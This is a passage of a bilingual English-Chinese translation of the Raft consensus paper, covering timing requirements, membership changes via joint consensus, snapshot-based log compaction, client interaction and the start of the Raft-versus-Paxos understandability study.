是幂等的，所以这种情况并不会引发任何问题。 例如，如果一个跟随者收到一个 AppendEntries 请求，其中包括其日志中已经存在的日志条目，它会忽视这此请求。</p><h3 id="5-6、Timing-and-availability（时间和可用性）"><a href="#5-6、Timing-and-availability（时间和可用性）" class="headerlink" title="5.6、Timing and availability（时间和可用性）"></a>5.6、Timing and availability（时间和可用性）</h3><p>One of our requirements for Raft is that safety must not depend on timing: the system must not produce incorrect results just because some event happens more quickly or slowly than expected. However, availability (the ability of the system to respond to clients in a timely manner) must inevitably depend on timing. For example, if message exchanges take longer than the typical time between server crashes, candidates will not stay up long enough to win an election; without a steady leader, Raft cannot make progress.</p><p>我们对Raft的一个要求是，安全性不能依赖于时间：系统不能仅仅因为某些事件发生得比预期的快或慢而产生错误的结果。然而，可用性（系统及时响应客户机的能力）必然取决于时间。例如，由于服务器崩溃而导致信息交换的时间比通常情况下更长，候选者就无法长时间等待来赢得选举。如果没有一个稳定的领导者，Raft就不能正常的执行。</p><p>Leader election is the aspect of Raft where timing is most critical. Raft will be able to elect and maintain a steady leader as long as the system satisfies the following timing requirement:</p><ul><li>broadcastTime ≪ electionTimeout ≪ MTBF</li></ul><p>领导者选举是 Raft 中时机最关键的方面。 只要系统满足以下时序要求，Raft 将能够选举和维护一个稳定的领导者：</p><ul><li>广播时间 &lt;&lt; 选举超时时间 &lt;&lt; 平均故障间隔（MTBF，Mean Time Between Failures）</li></ul><p>In this inequality broadcastTime is the average time it takes a server to send RPCs in parallel to every server in the cluster and receive their responses; electionTimeout is the election timeout described in Section 5.2; and MTBF is the average time between failures for a single server. The broadcast time should be an order of magnitude less than the election timeout so that leaders can reliably send the heartbeat messages required to keep followers from starting elections; given the randomized approach used for election timeouts, this inequality also makes split votes unlikely. The election timeout should be a few orders of magnitude less than MTBF so that the system makes steady progress. When the leader crashes, the system will be unavailable for roughly the election timeout; we would like this to represent only a small fraction of overall time.</p><p>在这个不等式中，广播时间（broadcastTime）是服务器向集群中的每个服务器并行发送 RPC 并接收它们的响应所花费的平均时间； 选举超时时间（electionTimeout）是第 5.2 节中描述的选举超时时间； 平均故障时间（MTBF，Mean Time Between Failures）是单个服务器的平均故障间隔时间。 广播时间应该比选举超时时间少一个数量级，这样领导者可以及时的发送心跳信息给跟随者以组织新的领导选举。通过使用随机的选举超时时间，分裂投票的情况也不大可能会出现。选举超时时间应该比 平均故障时间（MTBF） 小几个数量级，这样系统就能正常运行。 当领导者宕机时，系统将在选举超时时间（electionTimeout） 内不可用； 我们希望这仅占总时间的一小部分。</p><p>The broadcast time and MTBF are properties of the underlying system, while the election timeout is something we must choose. Raft’s RPCs typically require the recipient to persist information to stable storage, so the broadcast time may range from 0.5ms to 20ms, depending on storage technology. As a result, the election timeout is likely to be somewhere between 10ms and 500ms. Typical server MTBFs are several months or more, which easily satisfies the timing requirement.</p><p>广播时间（Broadcast Time）和 平均故障时间（MTBF，Mean Time Between Failures）是底层系统的属性，而选举超时时间是需要我们自己进行设置的。 Raft 的 RPCs 通常需要接收方将信息持久化到稳定的存储中，因此广播时间可能在 0.5 毫秒到 20 毫秒之间，具体取决于存储技术。 因此，选举超时很可能在 10 毫秒到 500 毫秒之间。 典型的服务器 MTBF 为几个月或更长时间，完全满足系统的时间因素要求。</p><h2 id="6、Cluster-membership-changes（集群成员变更）"><a href="#6、Cluster-membership-changes（集群成员变更）" class="headerlink" title="6、Cluster membership changes（集群成员变更）"></a>6、Cluster membership changes（集群成员变更）</h2><p>Up until now we have assumed that the cluster configuration (the set of servers participating in the consensus algorithm) is fixed. In practice, it will occasionally be necessary to change the configuration, for example to replace servers when they fail or to change the degree of replication. Although this can be done by taking the entire cluster off-line, updating configuration files, and then restarting the cluster, this would leave the cluster unavailable during the changeover. In addition, if there are any manual steps, they risk operator error. In order to avoid these issues, we decided to automate configuration changes and incorporate them into the Raft consensus algorithm.</p><p>到目前为止，我们假设集群配置（参与共识算法的服务器集）是固定的。 在实践中，有时需要更改配置，例如在服务器出现故障时更换服务器或更改复制的程度。 虽然这可以通过使整个集群下线、更改配置，然后重新启动集群来完成，但这会使集群在切换期间不可用。 另外，人为操作的因素也更容易引发系统错误。 为了避免这些问题，我们决定实现配置变更的自动化，并将其融合进共识算法中。</p><p>For the configuration change mechanism to be safe, there must be no point during the transition where it is possible for two leaders to be elected for the same term. Unfortunately, any approach where servers switch directly from the old configuration to the new configuration is unsafe. It isn’t possible to atomically switch all of the servers at once, so the cluster can potentially split into two independent majorities during the transition (see Figure 10).</p><p>为了保障配置变更机制的安全，在配置变更期间，不能存在同一任期内选举出两个领导者的情况。 不幸的是，任何服务器直接从旧配置切换到新配置的方法都是不安全的。 一次原子地切换所有服务器是不可能的，因此在转换过程中，集群极有可能出现裂脑现象（参见图 10）。</p><p><a href="https://cdn.bugwz.com/raft-mem-change.png"><img src="https://cdn.bugwz.com/raft-mem-change.png" alt="Cluster Membership Changes">Cluster Membership Changes</a></p><p>Figure 10: Switching directly from one configuration to another is unsafe because different servers will switch at different times. In this example, the cluster grows from three servers to five. Unfortunately, there is a point in time where two different leaders can be elected for the same term, one with a majority of the old configuration (Cold) and another with a majority of the new configuration (Cnew).</p><p>图 10：由于不同的服务器的切换时间不一样，因此直接从一种配置切换到另一种配置是不安全的。 在本例中，集群从三台服务器增加到五台。 不幸的是，有一个时间点上会出现同一个任期内可以选举出两个领导者的情况，一个领导者被拥有旧配置（Cold）的成员选举出，另一个则被拥有新配置（Cnew）的成员选举出。（在图例中出现问题的时刻，Server1可以通过自身以及Server2的投票拿到<strong>2&#x2F;3比例的选票？？</strong>而赢得选举，成为领导者；并且此时Server5可以通过自身和Server3以及Server4的投票<strong>拿到3&#x2F;5比例的选票？？</strong>赢得选举，最终存在两个领导者。）</p><p>In order to ensure safety, configuration changes must use a two-phase approach. There are a variety of ways to implement the two phases. For example, some systems (e.g., [22]) use the first phase to disable the old configuration so it cannot process client requests; then the second phase enables the new configuration. In Raft the cluster first switches to a transitional configuration we call joint consensus; once the joint consensus has been committed, the system then transitions to the new configuration. The joint consensus combines both the old and new configurations:</p><ul><li>Log entries are replicated to all servers in both configurations.</li><li>Any server from either configuration may serve as leader</li><li>Agreement (for elections and entry commitment) requires separate majorities from both the old and new configurations.</li></ul><p>为了确保安全，配置更改必须使用两阶段法。 有多种方法可以实现这两个阶段。 例如，某些系统（例如 [22]） 在第一阶段禁用旧配置，使其无法处理客户端请求； 然后在第二阶段启用新配置。 在 Raft 中，集群的配置会首先进入到我们称之为联合共识（joint consensus）的过渡配置； 一旦达成了联合共识，系统就会转换到新的配置。 联合共识中结合了新旧配置：</p><ul><li>日志条目会被复制到集群中两种配置下的所有服务器上。</li><li>任一配置中的任何服务器都可以作为领导者。</li><li>选举和日志条目提交的商定需要按照新旧配置中的大多数服务器原则来要求。</li></ul><p><a href="https://cdn.bugwz.com/raft-timeline-for-conf-change.png"><img src="https://cdn.bugwz.com/raft-timeline-for-conf-change.png" alt="Timeline For A Configuration Change">Timeline For A Configuration Change</a></p><p>Figure 11: Timeline for a configuration change. Dashed lines show configuration entries that have been created but not committed, and solid lines show the latest committed configuration entry. The leader first creates the Cold,new configuration entry in its log and commits it to Cold,new (a majority of Cold and a majority of Cnew). Then it creates the Cnew entry and commits it to a majority of Cnew. There is no point in time in which Cold and Cnew can both make decisions independently.</p><p>图 11：配置更改的时间表。 虚线代表已创建但未提交的配置条目，实线代表最新提交的配置条目。 领导者首先在其日志中创建 Cold,new 配置条目并将其提交到 Cold,new（大多数 Cold 和大多数 Cnew）。 然后它创建 Cnew 条目并将其提交给大多数 Cnew。 Cold 和 Cnew 没有时间窗口可以独立做出决定。</p><p>The joint consensus allows individual servers to transition between configurations at different times without compromising safety. Furthermore, joint consensus allows the cluster to continue servicing client requests throughout the configuration change.</p><p>联合共识（ joint consensus）允许单个服务器在不影响安全性的基础上，在不同的特定时刻进行不同配置的转换。 此外，联合共识允许集群在整个配置更改期间继续为客户端请求提供服务。</p><p>Cluster configurations are stored and communicated using special entries in the replicated log; Figure 11 illustrates the configuration change process. When the leader receives a request to change the configuration from Cold to Cnew, it stores the configuration for joint consensus (Cold,new in the figure) as a log entry and replicates that entry using the mechanisms described previously. Once a given server adds the new configuration entry to its log, it uses that configuration for all future decisions (a server always uses the latest configuration in its log, regardless of whether the entry is committed). This means that the leader will use the rules of Cold,new to determine when the log entry for Cold,new is committed. If the leader crashes, a new leader may be chosen under either Cold or Cold,new, depending on whether the winning candidate has received Cold,new. In any case, Cnew cannot make unilateral decisions during this period.</p><p>集群配置是通过使用复制日志中的特殊条目进行存储和通信； 图 11 说明了配置更改过程。 当领导者收到将配置从 Cold 更改为 Cnew 的请求时，它将联合共识的配置（图中的Cold,NEW）存储为日志条目，并按照前面所描述的机制将该条目复制给其他服务器。一旦某个服务器将收到的 Cold,new 配置日志条目并添加到自身的日志中，那么之后其所有的决策都将以此配置 Cold,new 为依据（服务器总是以日志中最新的配置为依据进行决策，无论该条目是否已提交）。 这意味着领导者将使用 Cold,new 的规则来确定 Cold,new 的日志条目何时被提交。 如果领导者发生了宕机，新的领导者将在旧配置 Cold或者联合配置 Cold,new 的机器中选举出来。这取决于获胜的候选者是否收到了 Cold,new。无论如何，Cnew在此期间不能单方面做出决定。</p><p>Once Cold,new has been committed, neitherCold norCnew can make decisions without approval of the other, and the Leader Completeness Property ensures that only servers with the Cold,new log entry can be elected as leader. It is now safe for the leader to create a log entry describing Cnew and replicate it to the cluster. Again, this configuration will take effect on each server as soon as it is seen. When the new configuration has been committed under the rules of Cnew, the old configuration is irrelevant and servers not in the new configuration can be shut down. As shown in Figure 11, there is no time when Cold and Cnew can both make unilateral decisions; this guarantees safety.</p><p>一旦 Cold,new 被提交后，具有Cold或者Cnew的服务器将不能再没有其它服务器允许的情况下单独做出任何决策，并且Leader Completeness Property 确保只有具有Cold,new 日志条目的服务器才能被选举为领导者。 此时，领导者可以安全地创建一个描述 Cnew 的日志条目并将其复制到集群的其他服务器中。 同样，当复制的服务器收到配置条目后就会立刻生效。当新的配置被提交后，旧的配置就变得无关紧要了，并且没有新配置的服务器可以被关闭了。 如图 11 所示，Cold 和 Cnew 没有时机能够单独做出决策， 这保证了安全。</p><p>There are three more issues to address for reconfiguration. The first issue is that new servers may not initially store any log entries. If they are added to the cluster in this state, it could take quite a while for them to catch up, during which time it might not be possible to commit new log entries. In order to avoid availability gaps, Raft introduces an additional phase before the configuration change, in which the new servers join the cluster as non-voting members (the leader replicates log entries to them, but they are not considered for majorities). Once the new servers have caught up with the rest of the cluster, the reconfiguration can proceed as described above.</p><p>在配置转换期间存在着三方面的问题，<strong>第一个就是新的服务器初始化启动的时候不包含任何日志条目，当它们加入集群中时，需要花费相当长的时间同步到最新的状态，在此期间，它将不能提交任何日志条目</strong>。为了避免可用性断层，Raft 在配置更改之前引入了一个额外的阶段，在这个阶段，新服务器作为非投票成员（none-voting）加入集群（领导者将日志条目复制给它们，但它们不纳入大多数考虑的范围）。当新的服务器同步到最新的状态后，就可以执行正常的配置转换过程了。</p><p>The second issue is that the cluster leader may not be part of the new configuration. In this case, the leader steps down (returns to follower state) once it has committed the Cnew log entry. This means that there will be a period of time (while it is committingCnew) when the leader is managing a cluster that does not include itself; it replicates log entries but does not count itself in majorities. The leader transition occurs when Cnew is committed because this is the first point when the new configuration can operate independently (it will always be possible to choose a leader from Cnew). Before this point, it may be the case that only a server from Cold can be elected leader.</p><p><strong>第二个问题是集群领导者可能是没有新配置的那一部分</strong>。 在这种情况下，一旦提交了Cnew配置，领导者就会被转换成跟随者。这就意味着会有一段时间领导者管理着一个不包含自己的集群。它复制日志条目，但是却将自身排除在大多数机器之外。当Cnew被提交时会发生领导者转换，因为这个是新配置可以独立运行的第一个时刻（总是可以从 Cnew 中选择领导者）。在此之前，只有处于Cold的服务器才可以被选举为领导者。</p><p>The third issue is that removed servers (those not in Cnew) can disrupt the cluster. These servers will not receive heartbeats, so they will time out and start new elections. They will then send RequestVote RPCs with new term numbers, and this will cause the current leader to revert to follower state. A new leader will eventually be elected, but the removed servers will time out again and the process will repeat, resulting in poor availability.</p><p><strong>第三个问题是无关的服务器（不在Cnew中的服务器）可能会破坏集群。</strong>因为这些服务器不会收到心跳请求，所以它们就会产生超时并启动新一轮的选举。然后它们发送带有新的任期号的RequestVote RPCs，这就会导致当前的领导者接收到请求后转换到跟随者状态，最终会选举出一个新的领导者。但是那些无关的的服务器会再次超时，如此循环往复，最终会导致系统可用性的大大降低。</p><p>To prevent this problem, servers disregard RequestVote RPCs when they believe a current leader exists. Specifically, if a server receives a RequestVote RPC within the minimum election timeout of hearing from a current leader, it does not update its term or grant its vote. This does not affect normal elections, where each server waits at least a minimum election timeout before starting an election. However, it helps avoid disruptions from removed servers: if a leader is able to get heartbeats to its cluster, then it will not be deposed by larger term numbers.</p><p>为了避免这样的问题发生，服务器在认为当前领导者存在时会忽略 RequestVote RPC。具体来说，如果服务器在听取当前领导者的最小选举超时内收到 RequestVote RPC，则不会更新其任期或授予其投票权。这不会影响正常选举，其中每个服务器在开始选举之前至少等待<strong>最小选举超时</strong>。 然而，它有助于避免被移除的服务器造成的扰乱：如果领导者能够发送心跳给集群，那么它就不会被更大的任期号废黜。</p><h2 id="7、Log-compaction（日志压缩）"><a href="#7、Log-compaction（日志压缩）" class="headerlink" title="7、Log compaction（日志压缩）"></a>7、Log compaction（日志压缩）</h2><p>Raft’s log grows during normal operation to incorporate more client requests, but in a practical system, it cannot grow without bound. As the log grows longer, it occupies more space and takes more time to replay. This will eventually cause availability problems without some mechanism to discard obsolete information that has accumulated in the log.</p><p>Raft日志会伴随着系统的日常运行持续增长。但在实际应用中，我们不能让它无限制的增长下去。日志越长，占用的存储空间越多，也将耗费状态机更多时间去重放日志条目。我们需要适当的机制来处理掉日志中的过期的信息，避免其影响系统的可用性。</p><p>Snapshotting is the simplest approach to compaction. In snapshotting, the entire current system state is written to a snapshot on stable storage, then the entire log up to that point is discarded. Snapshotting is used in Chubby and ZooKeeper, and the remainder of this section describes snapshotting in Raft.</p><p>快照是最简单的压缩方法。通过快照将某一时刻系统的当前状态写入快照文件，保存到磁盘，然后将这一时刻之前的所有日志丢弃。 Chubby 和 ZooKeeper 都使用了快照技术，本节的其余部分描述 Raft 中的快照。</p><p>Incremental approaches to compaction, such as log cleaning [36] and log-structured merge trees [30, 5], are also possible. These operate on a fraction of the data at once, so they spread the load of compaction more evenly over time. They first select a region of data that has accumulated many deleted and overwritten objects, then they rewrite the live objects from that region more compactly and free the region. This requires significant additional mechanism and complexity compared to snapshotting, which simplifies the problem by always operating on the entire data set. While log cleaning would require modifications to Raft, state machines can implement LSM trees using the same interface as snapshotting.</p><p>渐进式压缩方法，例如日志清理 [36] 和日志结构合并树 [30, 5]。 它们一次对一小部分数据进行操作，因此它们会随着时间的推移更均匀地分布压缩负载。 他们首先选择一个已经积累了许多已删除和覆盖对象的数据区域，然后他们更紧凑地重写该区域中的活动对象并释放该区域。 与快照相比，这需要大量额外的机制和复杂性，这通过始终对整个数据集进行操作来简化问题。 虽然日志清理需要对 Raft 进行修改，但状态机可以使用与快照相同的接口来实现 LSM 树。</p><p>Figure 12 shows the basic idea of snapshotting in Raft. Each server takes snapshots independently, covering just the committed entries in its log. Most of the work consists of the state machine writing its current state to the snapshot. Raft also includes a small amount of metadata in the snapshot: the last included index is the index of the last entry in the log that the snapshot replaces (the last entry the state machine had applied), and the last included term is the term of this entry. These are preserved to support the AppendEntries consistency check for the first log entry following the snapshot, since that entry needs a previous log index and term. To enable cluster membership changes (Section 6), the snapshot also includes the latest configuration in the log as of last included index. Once a server completes writing a snapshot, it may delete all log entries up through the last included index, as well as any prior snapshot.</p><p>图 12 展示了 Raft 中快照的基本思想。 各个服务器独立的对已提交的日志条目进行日志快照。主要的工作是由状态机将它当前的状态写入快照文件来完成。Raft也保留了一些元信息在快照中：last included index代表状态机最后应用的日志条目索引，last included term则是指这一条目的任期。因为日志条目需要包含preLogIndex和preLogTerm这两个属性以应对AppendEntries的一致性检查。为了支持集群成员变更（第 6 节），快照文件中也在last included index配置前包含了最新的配置条目。一旦服务器完成写入快照，他就会将last include index之前的所有日志条目都删除掉，以及任何先前的快照。</p><p><a href="https://cdn.bugwz.com/raft-log-compression.png"><img src="https://cdn.bugwz.com/raft-log-compression.png" alt="Log Compression">Log Compression</a></p><p>Figure 12: A server replaces the committed entries in its log (indexes 1 through 5) with a new snapshot, which stores just the current state (variables x and y in this example). The snapshot’s last included index and term serve to position the snapshot in the log preceding entry 6.</p><p>图 12：服务器用新快照替换其日志中已提交的条目（索引 1 到 5），该快照仅存储当前状态（在本例中为变量 x 和 y）。 快照最后包含的索引和术语用于将快照定位在条目 6 之前的日志中。</p><p>Although servers normally take snapshots independently, the leader must occasionally send snapshots to followers that lag behind. This happens when the leader has already discarded the next log entry that it needs to send to a follower. Fortunately, this situation is unlikely in normal operation: a follower that has kept up with the leader would already have this entry. However, an exceptionally slow follower or a new server joining the cluster (Section 6) would not. The way to bring such a follower up-to-date is for the leader to send it a snapshot over the network.</p><p>尽管服务器通常独立拍摄快照，但在领导者必须偶尔向落后的跟随者发送快照，这种情况通常是由于领导者可能会丢弃了它需要发送给跟随者的下一个日志条目。 幸运的是，这种情况在正常操作中不太可能发生：和领导者保持同步的跟随者拥有着领导者的所有日志，但是，落后非常大的跟随着或者刚加入集群的服务器（第6节）却并非如此。处理此类跟随者的机制就是领导者发送日志快照来进行同步。</p><p><a href="https://cdn.bugwz.com/raft-install-snapshot-rpc.png"><img src="https://cdn.bugwz.com/raft-install-snapshot-rpc.png" alt="InstallSnapshot RPC">InstallSnapshot RPC</a></p><p>Figure 13: A summary of the InstallSnapshot RPC. Snapshots are split into chunks for transmission; this gives the follower a sign of life with each chunk, so it can reset its election timer.</p><p>图 13：InstallSnapshot RPC 的摘要。 快照被分成块进行传输； 这为追随者提供了每个块的生命迹象，因此它可以重置其选举计时器。</p><p>The leader uses a new RPC called InstallSnapshot to send snapshots to followers that are too far behind; see Figure 13. When a follower receives a snapshot with this RPC, it must decide what to do with its existing log entries. Usually the snapshot will contain new information not already in the recipient’s log. In this case, the follower discards its entire log; it is all superseded by the snapshot and may possibly have uncommitted entries that conflict with the snapshot. If instead the follower receives a snapshot that describes a prefix of its log (due to retransmission or by mistake), then log entries covered by the snapshot are deleted but entries following the snapshot are still valid and must be retained.</p><p>领导者使用一个名为 InstallSnapshot 的新 RPC 向落后较大的追随者发送快照； 请参见图 13。当跟随者收到带有此 RPC 的快照时，它必须决定如何处理其现有的日志条目。 通常，快照将包含收件人日志中尚未包含的新信息。 在这种情况下，跟随者会丢弃其整个日志（可能包含未提交的和和快照中有冲突的条目），然后替换为快照中的日志条目。相反，如果跟随者收到的快照中包含的日志条目是其自身日志之前的部分的条目（因为重传或其他错误），那么就会将快照覆盖的自身日志条目删除掉，但是这之后的日志条目任然有效，需要保留下来。</p><p>This snapshotting approach departs from Raft’s strong leader principle, since followers can take snapshots without the knowledge of the leader. However, we think this departure is justified. While having a leader helps avoid conflicting decisions in reaching consensus, consensus has already been reached when snapshotting, so no decisions conflict. Data still only flows from leaders to followers, just followers can now reorganize their data.</p><p>这种快照方法与 Raft 的强领导原则背道而驰，因为跟随者可以在领导者不知情的情况下拍摄快照。 然而，我们认为这种背道而驰是合理的。 虽然拥有领导者有助于在达成共识时避免冲突的决策，但在快照时已经达成共识，因此没有决策冲突。 数据仍然只从领导者流向跟随者，现在只是跟随者可以重组他们自己的数据。</p><p>We considered an alternative leader-based approach in which only the leader would create a snapshot, then it would send this snapshot to each of its followers. However, this has two disadvantages. First, sending the snapshot to each follower would waste network bandwidth and slow the snapshotting process. Each follower already has the information needed to produce its own snapshots, and it is typically much cheaper for a server to produce a snapshot from its local state than it is to send and receive one over the network. Second, the leader’s implementation would be more complex. For example, the leader would need to send snapshots to followers in parallel with replicating new log entries to them, so as not to block new client requests.</p><p>我们考虑了另一种的基于领导者的方法（leader-based approach），其中只有领导者会创建一个快照，然后将这个快照发送给它的每个追随者。 但是这种方法有两个缺点。 首先，将快照发送给每个跟随者会浪费网络带宽并拖慢整个的快照过程。 每个跟随者已经拥有了生成自己的快照所需的信息，并且服务器从其本地状态生成快照通常比通过网络发送和接收快照成本更低。 其次，领导者的实现会变得更加复杂， 例如，领导者需要在向跟随者发送快照的同时发送新的日志条目，并且不能阻塞客户端的请求。</p><p>There are two more issues that impact snapshotting performance. First, servers must decide when to snapshot. If a server snapshots too often, it wastes disk bandwidth and energy; if it snapshots too infrequently, it risks exhausting its storage capacity, and it increases the time required to replay the log during restarts. One simple strategy is to take a snapshot when the log reaches a fixed size in bytes. If this size is set to be significantly larger than the expected size of a snapshot, then the disk bandwidth overhead for snapshotting will be small.</p><p>还有两个问题会影响快照的性能。 首先，服务器必须决定何时进行快照。 如果服务器快照过于频繁，则会浪费磁盘带宽和能源； 如果快照不频繁，则有可能会耗尽其存储容量，并且会增加重新启动期间重放日志所需的时间。 一种简单的策略是在日志达到固定大小（以字节为单位）时拍摄快照。 如果将此大小设置为明显大于快照的预期大小，则快照的磁盘带宽开销将很小。</p><p>The second performance issue is that writing a snapshot can take a significant amount of time, and we do not want this to delay normal operations. The solution is to use copy-on-write techniques so that new updates can be accepted without impacting the snapshot being written. For example, state machines built with functional data structures naturally support this. Alternatively, the operating system’s copy-on-write support (e.g., fork on Linux) can be used to create an in-memory snapshot of the entire state machine (our implementation uses this approach).</p><p>第二个性能问题是写入快照可能需要大量时间，我们不希望这影响正常的系统运行，我们可以采用Cow（copy-on-write）机制，这样就可以在不影响正在写入的快照的情况下接受新的更新。例如，基于功能性结构数据的状态机（state machines built with functional data structures）就天然的支持这种特性。或者我们可以使用操作系统的copy-on-write机制（例如，Linux 上的 fork）来创建状态机的内存快照（我们的实现使用这种方法）。</p><h2 id="8、Client-interaction（客户端交互）"><a href="#8、Client-interaction（客户端交互）" class="headerlink" title="8、Client interaction（客户端交互）"></a>8、Client interaction（客户端交互）</h2><p>This section describes how clients interact with Raft, including how clients find the cluster leader and how Raft supports linearizable semantics [10]. These issues apply to all consensus-based systems, and Raft’s solutions are similar to other systems.</p><p>本节描述客户端如何与 Raft 交互，包括客户端如何找到集群领导者以及 Raft 如何支持线性化语义（linearizable semantics）[10]。 这些问题适用于所有基于共识算法的系统，Raft 的解决方案与其他系统大体相同。</p><p>Clients of Raft send all of their requests to the leader. When a client first starts up, it connects to a randomlychosen server. If the client’s first choice is not the leader, that server will reject the client’s request and supply information about the most recent leader it has heard from (AppendEntries requests include the network address of the leader). If the leader crashes, client requests will time out; clients then try again with randomly-chosen servers.</p><p>Raft 的客户端将它们所有的请求发送给领导者。 当客户端第一次启动时，它会连接到随机选择的服务器。 如果客户端第一连接的不是领导者，则该服务器将拒绝客户端的请求，并提供有关它最近了解到的领导者的信息（AppendEntries 请求包括领导者的网络地址）。 如果领导者宕机，客户端请求就会超时，客户端然后使用随机选择的服务器进行重试。</p><p>Our goal for Raft is to implement linearizable semantics (each operation appears to execute instantaneously, exactly once, at some point between its invocation and its response). However, as described so far Raft can execute a command multiple times: for example, if the leader crashes after committing the log entry but before responding to the client, the client will retry the command with a new leader, causing it to be executed a second time. The solution is for clients to assign unique serial numbers to every command. Then, the state machine tracks the latest serial number processed for each client, along with the associated response. If it receives a command whose serial number has already been executed, it responds immediately without re-executing the request.</p><p>我们对 Raft 的目标是实现可线性化的语义（每一次操作都是立刻执行的，并且只执行一次）。 但是，到目前为止，Raft 也存在可能多次执行同一个命令的场景：例如，如果领导者在提交日志条目后但在回复客户端之前宕机，客户端就会重新向新的领导者发送同样的命令请求，这将会导致同一个命令被再次执行。解决方案是，客户端给每一次的请求命令添加一个唯一的序列码， 然后，服务器的状态机就可以根据请求的序列码追踪到相应的回复。当服务器收到一个和之前序列码相同的命令请求时，服务器就可以不必重新执行命令，而获取响应返回给客户端。</p><p>Read-only operations can be handled without writing anything into the log. However, with no additional measures, this would run the risk of returning stale data, since the leader responding to the request might have been superseded by a newer leader of which it is unaware. Linearizable reads must not return stale data, and Raft needs two extra precautions to guarantee this without using the log. First, a leader must have the latest information on which entries are committed. The Leader Completeness Property guarantees that a leader has all committed entries, but at the start of its term, it may not know which those are. To find out, it needs to commit an entry from its term. Raft handles this by having each leader commit a blank no-op entry into the log at the start of its term. Second, a leader must check whether it has been deposed before processing a read-only request (its information may be stale if a more recent leader has been elected). Raft handles this by having the leader exchange heartbeat messages with a majority of the cluster before responding to read-only requests. Alternatively, the leader could rely on the heartbeat mechanism to provide a form of lease [9], but this would rely on timing for safety (it assumes bounded clock skew).</p><p>只读操作可以直接处理而不需要写入日志，但是可能会返回过期数据，因为响应的领导者可能已经被新的领导者所替代。线性特性不允许返回过期数据，Raft在不记录日志的情况下需要两个额外的预防措施来避免这一情况的发生。第一，领导者必须拥有最新的日志条目。 Leader Completeness Property能够保证领导者拥有所有已提交的日志条目。但是在任期之初，领导者并不知道哪些条目是已提交的。为了解决这个问题，在任期开始的时候，领导者需要提交一个空的 no-op条目。第二，领导者在处理只读请求之前必须先检测一下自己是否已经被替代。Raft通过让领导者在处理只读请求之前向集群大多数服务器发送心跳信息来处理这个问题。或者，领导人可以依赖心跳机制来实现一种租约 [9]的机制，但是这种方法依赖时序来保证安全性。</p><h2 id="9、Implementation-and-evaluation（实现和评估）"><a href="#9、Implementation-and-evaluation（实现和评估）" class="headerlink" title="9、Implementation and evaluation（实现和评估）"></a>9、Implementation and evaluation（实现和评估）</h2><p>We have implemented Raft as part of a replicated state machine that stores configuration information for RAMCloud [33] and assists in failover of the RAMCloud coordinator. The Raft implementation contains roughly 2000 lines of C++ code, not including tests, comments, or blank lines. The source code is freely available [23]. There are also about 25 independent third-party open source implementations [34] of Raft in various stages of development, based on drafts of this paper. Also, various companies are deploying Raft-based systems [34].</p><p>我们已经实现了Raft，并将其作为存储 RAMCloud [33] 的配置信息和协助 RAMCloud 协调器的故障转移的复制状态机的一部分。 Raft 实现包含大约 2000 行 C++ 代码，不包括测试、注释或空行。 源代码可免费获得[23]。 根据本文的草稿，还有大约 25 个独立的第三方开源实现 [34] Raft 处于不同的开发阶段。 此外，各种公司正在部署基于 Raft 的系统 [34]。</p><p>The remainder of this section evaluates Raft using three criteria: understandability, correctness, and performance.</p><p>本节的其余部分使用三个标准评估 Raft：可理解性、正确性和性能。</p><h3 id="9-1、Understandability（可理解性）"><a href="#9-1、Understandability（可理解性）" class="headerlink" title="9.1、Understandability（可理解性）"></a>9.1、Understandability（可理解性）</h3><p>To measure Raft’s understandability relative to Paxos, we conducted an experimental study using upper-level undergraduate and graduate students in an Advanced Operating Systems course at Stanford University and a Distributed Computing course at U.C. Berkeley. We recorded a video lecture of Raft and another of Paxos, and created corresponding quizzes. The Raft lecture covered the content of this paper except for log compaction; the Paxos lecture covered enough material to create an equivalent replicated state machine, including single-decree Paxos, multi-decree Paxos, reconfiguration, and a few optimizations needed in practice (such as leader election). The quizzes tested basic understanding of the algorithms and also required students to reason about corner cases. Each student watched one video, took the corresponding quiz, watched the second video, and took the second quiz. About half of the participants did the Paxos portion first and the other half did the Raft portion first in order to account for both individual differences in performance and experience gained from the first portion of the study. We compared participants’ scores on each quiz to determine whether participants showed a better understanding of Raft.</p><p>为了对比 Raft 和 Paxos 的可理解性，我们对斯坦福大学（Stanford University）的高级操作系统课程（Advanced Operating Systems course）和加州大学（U.C. Berkeley）的分布式计算课程（Distributed Computing course）的高年级本科生和研究生进行了实验研究。我们录制了一个 Raft 和 Paxos 的视频讲座，并创建了相应的测验。 Raft 讲座涵盖了本文的内容，除了 log compaction； Paxos 讲座涵盖了足够的材料来创建等效的复制状态机，包括单决策 Paxos、多决策 Paxos、重新配置和一些实践中所需的优化（例如领导者选举）。测验测试了对算法的基本理解，还要求学生对极端情况进行推理。每个学生观看一个视频，参加相应的测验，观看第二个视频，并参加第二个测验。大约一半的参与者先做 Paxos 部分，另一半先做 Raft 部分，以考虑到从研究的第一部分中获得的表现和经验的个体差异。我们比较了参与者在每个测验中的分数，以确定参与者是否对 Raft 表现出更好的理解。</p><p><a href="https://cdn.bugwz.com/raft-paxos-compared.png"><img src="https://cdn.bugwz.com/raft-paxos-compared.png" alt="Raft and Paxos">Raft and Paxos</a></p><p>Figure 14: A scatter plot comparing 43 participants’ performance on the Raft and Paxos quizzes. Points above the diagonal (33) represent participants who scored higher for Raft.</p><p>图14：一个散点图，比较了43名参与者在 Raft 和 Paxos 测验中的表现。对角线（33）以上的分数代表在 Raft 得分较高的参与者。</p><p>We tried to make the comparison between Paxos and Raft as fair as possible. The experiment favored Paxos in two ways: 15 of the 43 participants reported having some prior experience with Paxos, and the Paxos video is 14% longer than the Raft video. As summarized in Table 1, we have taken steps to mitigate potential sources of bias. All of our materials are available for review [28, 31].</p><p>我们试图让 Paxos 和 Raft 之间的比较尽可能公平。 该实验在两个方面对 Paxos 有利：43 名参与者中有 15 人报告说有一些 Paxos 的先前经验，Paxos 视频比 Raft 视频长 14%。 如表 1 所述，我们已采取措施减轻潜在的偏见来源。 我们所有的材料都可供审查 [28, 31]。</p><p>On average, participants scored 4.9 points higher on the Raft quiz than on the Paxos quiz (out of a possible 60 points, the mean Raft score was 25.7 and the mean Paxos score was 20.8); Figure 14 shows their individual scores. A paired t-test states that, with 95% confidence, the true distribution of Raft scores has a mean at least 2.5 points larger than the true distribution of Paxos scores.</p><p>平均而言，参与者在 Raft 测验中的得分比 Paxos 测验高 4.9 分（在可能的 60 分中，平均 Raft 得分为 25.7，平均 Paxos 得分为 20.8）； 图 14 显示了他们的个人得分。 在成对的T检验中表明，在 95% 的置信度下，Raft 分数的真实分布的平均值至少比 Paxos 分数的真实分布高 2.5 分。</p><p>We also created a linear regression model that predicts a new student’s quiz scores based on 